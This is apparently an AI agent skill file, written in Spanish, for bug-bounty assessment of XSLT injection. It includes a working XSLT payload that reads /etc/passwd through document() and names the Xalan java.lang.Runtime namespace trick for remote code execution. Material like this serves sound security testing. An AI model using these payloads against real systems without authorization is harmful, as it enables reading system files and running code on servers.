---
name: bug-bounty-xslt-injection
description: Auditoría de vulnerabilidades XSLT Injection (Extensible Stylesheet Language Transformations). Lectura de archivos locales, SSRF y ejecución remota de código en procesadores XSLT.
---

# Skill: XSLT Injection Assessment

Esta habilidad capacita al agente para evaluar aplicaciones web que procesan transformaciones XML/XSLT dinámicas aceptando documentos XSLT o entradas no sanitizadas del usuario en la plantilla de diseño.

## 📌 Vectores de Diagnóstico XSLT

### 1. Lectura de Archivos Locales (Arbitrary File Read)
- Utilizando la función XML `document()`:
  ```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:value-of select="document('file:///etc/passwd')"/>
    </xsl:template>
  </xsl:stylesheet>
  ```

### 2. Ejecución Remota de Código (RCE en Procesadores Java/PHP/C#)
- **Java (Xalan / Saxon)**: Invocación de métodos Java nativos mediante extensiones namespace (`xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"`).

---

## 📚 Referencias Técnicas

Consulta los detalles y remediación en:
[xslt-techniques.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-xslt-injection/references/xslt-techniques.md)
